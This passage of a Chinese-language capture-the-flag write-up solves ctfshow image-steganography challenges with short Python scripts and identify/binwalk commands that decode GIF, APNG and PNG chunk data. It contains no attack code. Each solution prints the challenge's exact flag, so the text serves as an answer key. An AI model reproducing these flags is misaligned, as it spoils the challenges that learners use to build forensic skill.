punctuation\">(</span>img<span class=\"token punctuation\">.</span>frames<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    png<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span>base_path <span class=\"token operator\">/</span> <span class=\"token string\">\"&#123;i&#125;.png\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">=</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>ctfshow&#123;48b722b570c603ef58cc0b83bbf7680d&#125;</code></p>\n<h2 id=\"misc39\"><a class=\"anchor\" href=\"#misc39\">#</a> misc39</h2>\n<p>不同帧之间的间隔时间来隐写</p>\n<p>使用工具： <code>identify</code></p>\n<p><code>identify -format &quot;%T &quot; misc39.gif &gt; 1.txt  *#进行提取*</code></p>\n<p>得到的一串 <code>36</code>  和 <code>37</code> ，</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><prepre></td></tr></table></figure><p>`</p>\n<p><code>考虑把</code>  37 <code>换成</code>  1 <code>、</code> 36 <code>换成</code>  0 <code>，就得到长度为</code>  287 <code>的二进制字符串，考虑每</code>  7 <code>位转一个字符(正常是</code>  8 <code>位一组)，得到</code>  flag`。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s<span class=\"token operator\">=</span><span class=\"token string\">\"11000111110100110011011100111101000110111111101111111011011010101100100111000011000101100101100110110011001110010111001011010111001101100010011011111000101100101011001001101100111000110010001110010110110011001111000010111001110010111000101100011110000101100000110100011010101110011111101\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">41</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#287//7</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token operator\">*</span>i<span class=\"token punctuation\">:</span><span class=\"token number\">7</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>i<span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到 flag <code>ctfshow&#123;52812ff995fb7be268d963a9ebca0459&#125;</code></p>\n<h2 id=\"misc40\"><a class=\"anchor\" href=\"#misc40\">#</a> misc40</h2>\n<p>APNG 分解</p>\n<p>APNG Disassembler 分解出的 txt</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>path <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"file_path:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">28</span><span class=\"token punctuation\">,</span><span class=\"token number\">69</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span> <span class=\"token comment\">#flag 内容从 28 位开始</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>path <span class=\"token operator\">+</span> <span class=\"token string\">\"/apngframe%02s.txt\"</span> <span class=\"token operator\">%</span> i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    s <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">\"/\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"misc42\"><a class=\"anchor\" href=\"#misc42\">#</a> misc42</h2>\n<p>IDAT 各数据块长度转 ascii 码</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin\">file</span> <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"图片路径:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"rb\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>content <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>f<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>index <span class=\"token operator\">=</span> content<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">b\"IDAT\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>IHDR_end <span class=\"token operator\">=</span> index <span class=\"token operator\">-</span> <span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>num <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token string\">b\"IDAT\"</span> <span class=\"token keyword\">in</span> content<span class=\"token punctuation\">[</span>index<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    index <span class=\"token operator\">=</span> content<span class=\"token punctuation\">[</span>index<span class=\"token operator\">+</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">b\"IDAT\"</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> index <span class=\"token operator\">+</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">.</span>from_bytes<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">[</span>index <span class=\"token operator\">-</span> <span class=\"token number\">4</span><span class=\"token punctuation\">:</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string\">'big'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"misc43\"><a class=\"anchor\" href=\"#misc43\">#</a> misc43</h2>\n<p>将错误的 IDAT 块的 crc-code 提取出来，拼接起来十六进制转字符串即可得到 flag</p>\n<p><code>e59387e593a62e63746673686f777b36656232353839666666663565333930666536623837353034646263303839327D</code></p>\n<p><code>ctfshow&#123;6eb2589ffff5e390fe6b87504dbc0892&#125;</code></p>\n<h2 id=\"misc44\"><a class=\"anchor\" href=\"#misc44\">#</a> misc44</h2>\n<p>一种 CRC32 隐写，错误的 CRC32 和正确的 CRC32 分别代表着 01，再 8 位一组转字符</p>\n<p>使用 pngdebugger 输出检查结果，关注到 <code>c</code>  对应的二进制为 <code>01100011</code> ，然而得到的 <code>res</code>  前面有 17 个 1，那么可以忽略或取其 4 的倍数个</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>path <span class=\"token operator\">=</span> <span class=\"token string\">\"text_path\"</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>res <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">,</span>encoding<span class=\"token operator\">=</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        line <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> line<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"CRC OK!\"</span> <span class=\"token keyword\">in</span> line<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            res <span class=\"token operator\">=</span> res <span class=\"token operator\">+</span> <span class=\"token string\">\"1\"</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">elif</span> <span class=\"token string\">\"CRC FAILED\"</span> <span class=\"token keyword\">in</span> line<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            res <span class=\"token operator\">=</span> res <span class=\"token operator\">+</span> <span class=\"token string\">\"0\"</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>res <span class=\"token operator\">=</span> res<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">[</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span>i<span class=\"token operator\">*</span><span class=\"token number\">8</span><span class=\"token operator\">+</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>得到 <code>ÿÿctfshow&#123;cc1af32bf96308fc1263231be783f69e&#125;</code></p>\n<h2 id=\"misc45\"><a class=\"anchor\" href=\"#misc45\">#</a> misc45</h2>\n<p>题目提示换一换思维格式</p>\n<p>将 PNG 格式转化成 BMP<br />\n 使用 binwalk 进行分解<br />\n得到 gz 压缩文件，打开后<br />\n得到 flag</p>\n<p><code>ctfshow&#123;057a722a5587979c34966c2436283e70&#125;</code></p>\n<h2 id=\"misc46\"><a class=\"anchor\" href=\"#misc46\">#</a> misc46</h2>\n<p>用 gif 每一帧的偏移量作为坐标来画图即可，gif 的偏移量用 identify 命令直接获取的</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>identify misc46.gif <span class=\"token operator\">></span> <span class=\"token number\">2</span>.txt</pre></td></tr></table></figure><p>画图脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> matplotlib<span class=\"token punctuation\">.</span>pyplot <span class=\"token keyword\">as</span> plt</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'2.txt'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>pp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    c <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>readline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">if</span> c<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        s <span class=\"token operator\">=</span> <span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'+'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token string\">','</span><span class=\"token operator\">+</span>c<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'+'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        pp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\"># print(c)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">,</span><span class=\"token number\">70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> pp<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    new <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    img<span class=\"token punctuation\">.</span>paste<span class=\"token punctuation\">(</span>new<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>plt<span class=\"token punctuation\">.</span>imshow<span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>plt<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"misc47\"><a class=\"anchor\" href=\"#misc47\">#</a> misc47</h2>\n<p>给了一个 png，打开发现没内容，用浏览器打开，确认是 apng</p>\n<p>简单来说就是每一个 IDAT 块前面都会有一个 fcTL 块，它其中就包含水平垂直偏移量</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> struct</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> matplotlib<span class=\"token punctuation\">.</span>pyplot <span class=\"token keyword\">as</span> plt</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'misc47.png'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>c <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> c<span class=\"token punctuation\">[</span>c<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token string\">'6663544C00000001'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>pp <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1124</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    start <span class=\"token operator\">=</span> c<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span><span class=\"token string\">'6663544C0000'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">'>h'</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token comment\"># start = c.index(bytes.fromhex('6663544C000000'+hex(i)[2:]))</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token comment\"># print(start)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    fc <span class=\"token operator\">=</span> c<span class=\"token punctuation\">[</span>start<span class=\"token punctuation\">:</span>start<span class=\"token operator\">+</span><span class=\"token number\">30</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>fc<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>fc<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">:</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>struct<span class=\"token punctuation\">.</span>unpack<span class=\"token punctuation\">(</span><span class=\"token string\">'>h'</span><span class=\"token punctuation\">,</span>fc<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>struct<span class=\"token punctuation\">.</span>unpack<span class=\"token punctuation\">(</span><span class=\"token string\">'>h'</span><span class=\"token punctuation\">,</span>fc<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">:</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    pp<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>struct<span class=\"token punctuation\">.</span>unpack<span class=\"token punctuation\">(</span><span class=\"token string\">'>h'</span><span class=\"token punctuation\">,</span>fc<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">:</span><span class=\"token number\">20</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>struct<span class=\"token punctuation\">.</span>unpack<span class=\"token punctuation\">(</span><span class=\"token string\">'>h'</span><span class=\"token punctuation\">,</span>fc<span class=\"token punctuation\">[</span><span class=\"token number\">22</span><span class=\"token punctuation\">:</span><span class=\"token number\">24</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\"># print(fc.index(b'\\xb6'),fc.index(b'\\x34'))</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token comment\"># print(c[:100])</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">400</span><span class=\"token punctuation\">,</span><span class=\"token number\">70</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">,</span><span class=\"token number\">255</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> pp<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    new <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    img<span class=\"token punctuation\">.</span>paste<span class=\"token punctuation\">(</span>new<span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>plt<span class=\"token punctuation\">.</span>imshow<span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>plt<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>ctfshow&#123;6d51f85b45a0061754a2776a32cf26c4&#125;</code></p>\n<h2 id=\"misc48\"><a class=\"anchor\" href=\"#misc48\">#</a> misc48</h2>\n<p>用 010editor 打开，发现右侧文本信息有提示</p>\n<p>1、统计 FF 的数量，再减去 1</p>\n<p>2、ctfshow {} 中包含 32 个字符</p>\n<p>第一条提示，其实指的是统计每两个有意义块之间的 FF 的数量再减一</p>\n<p>图中紫色的就是，开头的那个 FF 也算，因为只有一个，减去 1 后就是 0；接下来是 12、11、0…</p>\n<p>因为 flag 长度是 32 位，所以只统计前 32 个，即：</p>\n<p><code>0 12 11 0 7 10 13 13 9 0 9 13 0 13 6 0 10 9 2 1 0 1 10 8 11 5 12 7 2 2 3 10</code></p>\n<p>用小脚本跑一下</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>s <span class=\"token operator\">=</span> <span class=\"token string\">'0 12 11 0 7 10 13 13 9 0 9 13 0 13 6 0 10 9 2 1 0 1 10 8 11 5 12 7 2 2 3 10'</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>d <span class=\"token operator\">=</span> <span class=\"token string\">'0123456789abcdef'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> s<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">[</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><code>0cb07add909d0d60a92101a8b5c7223a</code></p>\n<p><code>ctfshow&#123;0cb07add909d0d60a92101a8b5c7223a&#125;</code></p>\n<h2 id=\"misc49\"><a class=\"anchor\" href=\"#misc49\">#</a> misc49</h2>\n<p>用 010editor 打开，能看到很多字符串</p>\n<p>重点是这些字符串前面，都出现过 FFE? 这种格式的数据，搜索一下发现有挺多的</p>\n<p>把所有十六进制数保存在 1.txt 中，用一个小脚本处理一下</p>\n<p>如果带有 \\x，在记事本中直接替换掉所有的即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>f<span class=\"token operator\">=</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1.txt\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>txt<span class=\"token operator\">=</span>f<span class=\"token 